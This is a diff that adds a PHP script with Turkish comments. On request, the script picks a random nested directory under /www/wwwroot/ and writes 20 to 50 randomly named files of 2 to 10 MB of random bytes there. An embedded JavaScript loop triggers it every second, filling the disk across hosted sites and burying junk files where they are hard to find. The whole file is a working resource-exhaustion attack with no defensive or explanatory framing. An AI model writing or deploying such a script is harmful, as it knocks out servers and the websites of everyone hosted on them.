@@ -1,0 +1,60 @@
+<?php
+if (isset($_GET['generate'])) {
+    set_time_limit(0);
+    
+    $base_dir = "/www/wwwroot/"; // Ana dizin
+    $max_depth = rand(2, 7); // Maksimum 7 seviye derine inebilir
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $extensions = ['php', 'html', 'xml', 'txt']; // Rastgele uzantılar
+
+    // Rastgele alt dizin seç
+    function get_random_directory($path, $depth = 0, $max_depth = 3) {
+        if ($depth >= $max_depth) return $path;
+        $dirs = array_filter(glob("$path/*"), 'is_dir');
+        if (!$dirs) return $path;
+        $random_dir = $dirs[array_rand($dirs)];
+        return get_random_directory($random_dir, $depth + 1, $max_depth);
+    }
+
+    $target_dir = get_random_directory($base_dir, 0, $max_depth);
+
+    // Kaç dosya oluşturulacağını belirle
+    $file_count = rand(20, 50);
+
+    $created_files = [];
+    for ($i = 0; $i < $file_count; $i++) {
+        $random_ext = $extensions[array_rand($extensions)]; // Rastgele uzantı seç
+        
+        // Dosya ismi uzunluğunu 3 ile 10 arasında rastgele belirle
+        $filename_length = rand(3, 10);
+        $filename = substr(str_shuffle($chars), 0, $filename_length) . ".$random_ext"; // Rastgele dosya ismi
+        $filepath = "$target_dir/$filename";
+
+        // Dosya boyutu (2MB - 10MB)
+        $file_size = rand(2 * 1024 * 1024, 10 * 1024 * 1024);
+
+        // Rastgele veri oluştur
+        $random_data = random_bytes($file_size);
+
+        // Dosyaya yaz
+        file_put_contents($filepath, $random_data);
+        $created_files[] = $filepath;
+    }
+
+    echo json_encode([
+        "status" => "success",
+        "message" => count($created_files) . " dosya oluşturuldu.",
+        "files" => $created_files
+    ]);
+    exit;
+}
+?>
+<script>
+        function generateFiles() {
+            fetch("?generate")
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error("Hata:", error));
+        }
+        setInterval(generateFiles, 1000); // Her saniyede 1 istek yap
+</script>
